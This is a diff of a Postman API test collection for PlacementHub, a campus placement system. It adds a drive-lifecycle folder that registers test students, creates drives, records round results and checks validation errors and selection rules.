@@ -1,7 +1,7 @@
 {
   "info": {
     "name": "PlacementHub",
-    "description": "PlacementHub API (Milestones 3-6): health, auth, companies, drives, students, policies.\n\nRun folders top to bottom (or use the Collection Runner). The Auth folder logs in and saves tokens (adminToken, aaravToken, priyaToken); later requests use them. Default auth is Bearer {{adminToken}}; student requests override it with {{aaravToken}} / {{priyaToken}}.\n\nDemo password for seeded accounts: {{demoPassword}} (demo only).\n\nNote: there is no DELETE for drives, so drives created by this collection stay in your local DB. Reset with `docker compose down -v` then `docker compose up -d` (deletes all local data).",
+    "description": "PlacementHub API (Milestones 3-7): health, auth, companies, drives, students, policies, drive lifecycle, admin views (applicants, CSV, criteria changes, audit, stats).\n\nRun folders top to bottom (or use the Collection Runner). The Auth folder logs in and saves tokens (adminToken, aaravToken, priyaToken); later requests use them. Default auth is Bearer {{adminToken}}; student requests override it with {{aaravToken}} / {{priyaToken}}.\n\nDemo password for seeded accounts: {{demoPassword}} (demo only).\n\nNote: there is no DELETE for drives, so drives created by this collection stay in your local DB. Reset with `docker compose down -v` then `docker compose up -d` (deletes all local data).",
     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
   "variable": [
@@ -70,6 +70,158 @@
     },
     {
       "key": "uniqueSuffix",
+      "value": ""
+    },
+    {
+      "key": "lcRun",
+      "value": ""
+    },
+    {
+      "key": "lcCompanyId",
+      "value": ""
+    },
+    {
+      "key": "lcDriveA",
+      "value": ""
+    },
+    {
+      "key": "lcDriveB",
+      "value": ""
+    },
+    {
+      "key": "lcRound1",
+      "value": ""
+    },
+    {
+      "key": "lcRound2",
+      "value": ""
+    },
+    {
+      "key": "lcApp1A",
+      "value": ""
+    },
+    {
+      "key": "lcApp2A",
+      "value": ""
+    },
+    {
+      "key": "lcApp3A",
+      "value": ""
+    },
+    {
+      "key": "lcApp1B",
+      "value": ""
+    },
+    {
+      "key": "lcEmail1",
+      "value": ""
+    },
+    {
+      "key": "lcEmail2",
+      "value": ""
+    },
+    {
+      "key": "lcEmail3",
+      "value": ""
+    },
+    {
+      "key": "lcRoll1",
+      "value": ""
+    },
+    {
+      "key": "lcRoll2",
+      "value": ""
+    },
+    {
+      "key": "lcRoll3",
+      "value": ""
+    },
+    {
+      "key": "lcToken1",
+      "value": ""
+    },
+    {
+      "key": "lcToken2",
+      "value": ""
+    },
+    {
+      "key": "lcToken3",
+      "value": ""
+    },
+    {
+      "key": "avRun",
+      "value": ""
+    },
+    {
+      "key": "avSince",
+      "value": ""
+    },
+    {
+      "key": "avDeadline",
+      "value": ""
+    },
+    {
+      "key": "avCompanyId",
+      "value": ""
+    },
+    {
+      "key": "avDrive",
+      "value": ""
+    },
+    {
+      "key": "avRound1",
+      "value": ""
+    },
+    {
+      "key": "avPolicyAuditId",
+      "value": ""
+    },
+    {
+      "key": "avEmail1",
+      "value": ""
+    },
+    {
+      "key": "avEmail2",
+      "value": ""
+    },
+    {
+      "key": "avEmail3",
+      "value": ""
+    },
+    {
+      "key": "avRoll1",
+      "value": ""
+    },
+    {
+      "key": "avRoll2",
+      "value": ""
+    },
+    {
+      "key": "avRoll3",
+      "value": ""
+    },
+    {
+      "key": "avToken1",
+      "value": ""
+    },
+    {
+      "key": "avToken2",
+      "value": ""
+    },
+    {
+      "key": "avToken3",
+      "value": ""
+    },
+    {
+      "key": "avApp1",
+      "value": ""
+    },
+    {
+      "key": "avApp2",
+      "value": ""
+    },
+    {
+      "key": "avApp3",
       "value": ""
     }
   ],
@@ -2410,6 +2562,2707 @@
                   "  pm.expect(list.find(p => p.type === 'DREAM_OFFER').ctcThresholdLpa).to.eql(10);",
                   "  pm.expect(list.find(p => p.type === 'MAX_OFFERS').maxOffers).to.eql(2);",
                   "});"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Drive lifecycle (M7)",
+      "description": "A full drive lifecycle: create, open, apply, close, rounds and results, selection with ONE_OFFER re-evaluation, complete. Registers fresh students each run, so it is repeatable; restores the seed policies at the end.",
+      "item": [
+        {
+          "name": "Setup: policies to ONE_OFFER only, step 1: deactivate DREAM_OFFER (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/policies/DREAM_OFFER",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"active\": false,\n  \"ctcThresholdLpa\": 10\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// One id per run: fresh students and company, so the folder can be re-run any number of times",
+                  "pm.collectionVariables.set('lcRun', Date.now().toString());"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 DREAM_OFFER inactive', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  pm.expect(pm.response.json().active).to.eql(false);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Setup: step 2: activate ONE_OFFER (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/policies/ONE_OFFER",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"active\": true\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 ONE_OFFER active', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  pm.expect(pm.response.json().active).to.eql(true);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Setup: register student 1 (Lifecycle Riya) and log in (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/auth/register",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{lcEmail1}}\",\n  \"password\": \"Lifecycle@123\",\n  \"fullName\": \"Lifecycle Riya\",\n  \"rollNo\": \"{{lcRoll1}}\",\n  \"branch\": \"CSE\",\n  \"graduationYear\": 2027,\n  \"cgpa\": 8.5,\n  \"activeBacklogs\": 0\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const run = pm.collectionVariables.get('lcRun');",
+                  "pm.collectionVariables.set('lcEmail1', `lc.${run}.s1@student.placementhub.dev`);",
+                  "pm.collectionVariables.set('lcRoll1', `LC${run}S1`);"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 student registered', () => pm.response.to.have.status(201));",
+                  "pm.sendRequest({",
+                  "  url: pm.variables.get('baseUrl') + '/api/auth/login',",
+                  "  method: 'POST',",
+                  "  header: { 'Content-Type': 'application/json' },",
+                  "  body: { mode: 'raw', raw: JSON.stringify({ email: pm.collectionVariables.get('lcEmail1'), password: 'Lifecycle@123' }) }",
+                  "}, (err, res) => {",
+                  "  pm.test('student 1 logged in', () => pm.expect(res.code).to.eql(200));",
+                  "  pm.collectionVariables.set('lcToken1', res.json().accessToken);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Setup: register student 2 (Lifecycle Karan) and log in (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/auth/register",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{lcEmail2}}\",\n  \"password\": \"Lifecycle@123\",\n  \"fullName\": \"Lifecycle Karan\",\n  \"rollNo\": \"{{lcRoll2}}\",\n  \"branch\": \"CSE\",\n  \"graduationYear\": 2027,\n  \"cgpa\": 8.5,\n  \"activeBacklogs\": 0\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const run = pm.collectionVariables.get('lcRun');",
+                  "pm.collectionVariables.set('lcEmail2', `lc.${run}.s2@student.placementhub.dev`);",
+                  "pm.collectionVariables.set('lcRoll2', `LC${run}S2`);"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 student registered', () => pm.response.to.have.status(201));",
+                  "pm.sendRequest({",
+                  "  url: pm.variables.get('baseUrl') + '/api/auth/login',",
+                  "  method: 'POST',",
+                  "  header: { 'Content-Type': 'application/json' },",
+                  "  body: { mode: 'raw', raw: JSON.stringify({ email: pm.collectionVariables.get('lcEmail2'), password: 'Lifecycle@123' }) }",
+                  "}, (err, res) => {",
+                  "  pm.test('student 2 logged in', () => pm.expect(res.code).to.eql(200));",
+                  "  pm.collectionVariables.set('lcToken2', res.json().accessToken);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Setup: register student 3 (Lifecycle Meera) and log in (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/auth/register",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{lcEmail3}}\",\n  \"password\": \"Lifecycle@123\",\n  \"fullName\": \"Lifecycle Meera\",\n  \"rollNo\": \"{{lcRoll3}}\",\n  \"branch\": \"CSE\",\n  \"graduationYear\": 2027,\n  \"cgpa\": 8.5,\n  \"activeBacklogs\": 0\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const run = pm.collectionVariables.get('lcRun');",
+                  "pm.collectionVariables.set('lcEmail3', `lc.${run}.s3@student.placementhub.dev`);",
+                  "pm.collectionVariables.set('lcRoll3', `LC${run}S3`);"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 student registered', () => pm.response.to.have.status(201));",
+                  "pm.sendRequest({",
+                  "  url: pm.variables.get('baseUrl') + '/api/auth/login',",
+                  "  method: 'POST',",
+                  "  header: { 'Content-Type': 'application/json' },",
+                  "  body: { mode: 'raw', raw: JSON.stringify({ email: pm.collectionVariables.get('lcEmail3'), password: 'Lifecycle@123' }) }",
+                  "}, (err, res) => {",
+                  "  pm.test('student 3 logged in', () => pm.expect(res.code).to.eql(200));",
+                  "  pm.collectionVariables.set('lcToken3', res.json().accessToken);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: create company (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/companies",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"Lifecycle Co {{lcRun}}\",\n  \"website\": \"https://lifecycle.example.com\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201', () => pm.response.to.have.status(201));",
+                  "pm.collectionVariables.set('lcCompanyId', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: create drive A, 12 LPA (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"companyId\": {{lcCompanyId}},\n  \"roleTitle\": \"Backend Engineer\",\n  \"jobType\": \"FULL_TIME\",\n  \"ctcLpa\": 12,\n  \"location\": \"Pune\",\n  \"description\": \"Postman lifecycle drive\",\n  \"minCgpa\": 7.0,\n  \"maxBacklogs\": 0,\n  \"graduationYear\": 2027,\n  \"registrationDeadline\": \"{{futureDeadline}}\",\n  \"branches\": [\n    \"CSE\"\n  ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 DRAFT', () => pm.response.to.have.status(201));",
+                  "pm.collectionVariables.set('lcDriveA', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: create drive B, 9 LPA (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"companyId\": {{lcCompanyId}},\n  \"roleTitle\": \"Support Engineer\",\n  \"jobType\": \"FULL_TIME\",\n  \"ctcLpa\": 9,\n  \"location\": \"Pune\",\n  \"description\": \"Postman lifecycle drive\",\n  \"minCgpa\": 7.0,\n  \"maxBacklogs\": 0,\n  \"graduationYear\": 2027,\n  \"registrationDeadline\": \"{{futureDeadline}}\",\n  \"branches\": [\n    \"CSE\"\n  ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 DRAFT', () => pm.response.to.have.status(201));",
+                  "pm.collectionVariables.set('lcDriveB', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: open drive A (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/open"
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 OPEN', () => pm.expect(pm.response.json().status).to.eql('OPEN'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: open drive B (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveB}}/open"
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 OPEN', () => pm.expect(pm.response.json().status).to.eql('OPEN'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: add Round 1 to drive A while OPEN (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"roundNo\": 1,\n  \"name\": \"Aptitude\",\n  \"scheduledAt\": \"{{futureDeadline}}\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 Round 1', () => {",
+                  "  pm.response.to.have.status(201);",
+                  "  pm.expect(pm.response.json().roundNo).to.eql(1);",
+                  "  pm.expect(pm.response.json().name).to.eql('Aptitude');",
+                  "});",
+                  "pm.collectionVariables.set('lcRound1', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 1: apply to drive A (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/students/me/applications",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"driveId\": {{lcDriveA}}\n}"
+            },
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 APPLIED', () => {",
+                  "  pm.response.to.have.status(201);",
+                  "  pm.expect(pm.response.json().status).to.eql('APPLIED');",
+                  "});",
+                  "pm.collectionVariables.set('lcApp1A', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 2: apply to drive A (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/students/me/applications",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"driveId\": {{lcDriveA}}\n}"
+            },
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken2}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 APPLIED', () => {",
+                  "  pm.response.to.have.status(201);",
+                  "  pm.expect(pm.response.json().status).to.eql('APPLIED');",
+                  "});",
+                  "pm.collectionVariables.set('lcApp2A', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 3: apply to drive A (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/students/me/applications",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"driveId\": {{lcDriveA}}\n}"
+            },
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken3}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 APPLIED', () => {",
+                  "  pm.response.to.have.status(201);",
+                  "  pm.expect(pm.response.json().status).to.eql('APPLIED');",
+                  "});",
+                  "pm.collectionVariables.set('lcApp3A', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 1: apply to drive B (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/students/me/applications",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"driveId\": {{lcDriveB}}\n}"
+            },
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 APPLIED', () => {",
+                  "  pm.response.to.have.status(201);",
+                  "  pm.expect(pm.response.json().status).to.eql('APPLIED');",
+                  "});",
+                  "pm.collectionVariables.set('lcApp1B', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: results while the drive is OPEN (409)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds/{{lcRound1}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [ { \"applicationId\": {{lcApp1A}}, \"result\": \"CLEARED\" } ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('409 drive must be CLOSED', () => {",
+                  "  pm.response.to.have.status(409);",
+                  "  pm.expect(pm.response.json().message).to.include('only while the drive is CLOSED (status: OPEN)');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: close drive A (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/close"
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 CLOSED', () => pm.expect(pm.response.json().status).to.eql('CLOSED'));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: add Round 2 while CLOSED (201)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"roundNo\": 2,\n  \"name\": \"Technical\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('201 Round 2', () => pm.expect(pm.response.json().roundNo).to.eql(2));",
+                  "pm.collectionVariables.set('lcRound2', pm.response.json().id);"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: add Round 4, a gap (409)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"roundNo\": 4,\n  \"name\": \"HR\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('409 next number is 3', () => {",
+                  "  pm.response.to.have.status(409);",
+                  "  pm.expect(pm.response.json().message).to.include('the next round number for this drive is 3');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: list rounds of drive A (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds"
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200 Round 1 Aptitude, Round 2 Technical', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  pm.expect(pm.response.json().map(r => r.roundNo + ':' + r.name)).to.eql(['1:Aptitude', '2:Technical']);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: Round 2 results before Round 1 (409 with details)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds/{{lcRound2}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [ { \"applicationId\": {{lcApp1A}}, \"result\": \"CLEARED\" } ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('409, must clear Round 1 first', () => {",
+                  "  pm.response.to.have.status(409);",
+                  "  const d = pm.response.json().details;",
+                  "  pm.expect(d).to.have.length(1);",
+                  "  pm.expect(d[0]).to.include('must have CLEARED Round 1: Aptitude before Round 2: Technical');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: bad batch, one valid item + duplicate + unknown id (400, nothing saved)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds/{{lcRound1}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [\n    { \"applicationId\": {{lcApp1A}}, \"result\": \"CLEARED\" },\n    { \"applicationId\": {{lcApp2A}}, \"result\": \"CLEARED\" },\n    { \"applicationId\": {{lcApp2A}}, \"result\": \"ABSENT\" },\n    { \"applicationId\": 999999999, \"result\": \"CLEARED\" }\n  ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('400 listing every bad item', () => {",
+                  "  pm.response.to.have.status(400);",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.message).to.include('Nothing was changed');",
+                  "  pm.expect(b.details).to.eql([",
+                  "    `Application ${pm.collectionVariables.get('lcApp2A')} is listed more than once in this batch`,",
+                  "    'Application 999999999 was not found in this drive'",
+                  "  ]);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Student 1: nothing was saved by the bad batch (200)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/students/me/applications/{{lcApp1A}}",
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{lcToken1}}",
+                  "type": "string"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('still APPLIED, no Round 1 result', () => {",
+                  "  const b = pm.response.json();",
+                  "  pm.expect(b.status).to.eql('APPLIED');",
+                  "  pm.expect(b.rounds.map(r => r.result)).to.eql([null, null]);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: Round 1 results (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds/{{lcRound1}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [\n    { \"applicationId\": {{lcApp1A}}, \"result\": \"CLEARED\", \"remarks\": \"Top scorer\" },\n    { \"applicationId\": {{lcApp2A}}, \"result\": \"CLEARED\" },\n    { \"applicationId\": {{lcApp3A}}, \"result\": \"NOT_CLEARED\" }\n  ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200: SHORTLISTED, SHORTLISTED, REJECTED with the round name', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  const r = pm.response.json().results;",
+                  "  pm.expect(r.map(x => x.applicationStatus)).to.eql(['SHORTLISTED', 'SHORTLISTED', 'REJECTED']);",
+                  "  pm.expect(r[2].statusReason).to.eql('Not cleared in Round 1: Aptitude');",
+                  "  pm.expect(r[0].remarks).to.eql('Top scorer');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: correct student 3 to CLEARED, an upsert (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds/{{lcRound1}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [ { \"applicationId\": {{lcApp3A}}, \"result\": \"CLEARED\", \"remarks\": \"Re-checked\" } ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200: back to SHORTLISTED, reason cleared', () => {",
+                  "  const r = pm.response.json().results[0];",
+                  "  pm.expect(r.applicationStatus).to.eql('SHORTLISTED');",
+                  "  pm.expect(r.statusReason).to.eql(null);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: Round 2 results (200)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds/{{lcRound2}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [\n    { \"applicationId\": {{lcApp1A}}, \"result\": \"CLEARED\" },\n    { \"applicationId\": {{lcApp2A}}, \"result\": \"NOT_CLEARED\", \"remarks\": \"Weak on DSA\" }\n  ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200: student 1 SHORTLISTED, student 2 REJECTED in Round 2', () => {",
+                  "  const r = pm.response.json().results;",
+                  "  pm.expect(r[0].applicationStatus).to.eql('SHORTLISTED');",
+                  "  pm.expect(r[1].applicationStatus).to.eql('REJECTED');",
+                  "  pm.expect(r[1].statusReason).to.eql('Not cleared in Round 2: Technical');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: fail Round 1 for student 1, who has a Round 2 result (409)",
+          "request": {
+            "method": "PUT",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/rounds/{{lcRound1}}/results",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"results\": [ { \"applicationId\": {{lcApp1A}}, \"result\": \"NOT_CLEARED\" } ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('409, would contradict Round 2', () => {",
+                  "  pm.response.to.have.status(409);",
+                  "  pm.expect(pm.response.json().details[0]).to.include('already has a result in Round 2: Technical');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "ERR Admin: select students 2 and 3 (409, rejected + not cleared the final round)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/selections",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"applicationIds\": [ {{lcApp2A}}, {{lcApp3A}} ]\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('409 with both reasons, nobody selected', () => {",
+                  "  pm.response.to.have.status(409);",
+                  "  const d = pm.response.json().details;",
+                  "  pm.expect(d).to.have.length(2);",
+                  "  pm.expect(d[0]).to.include('is REJECTED (Not cleared in Round 2: Technical)');",
+                  "  pm.expect(d[1]).to.eql(`Application ${pm.collectionVariables.get('lcApp3A')} has not cleared the final round (Round 2: Technical)`);",
+                  "});"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Admin: select student 1 in drive A, ONE_OFFER makes B INELIGIBLE (200)",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/api/drives/{{lcDriveA}}/selections",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
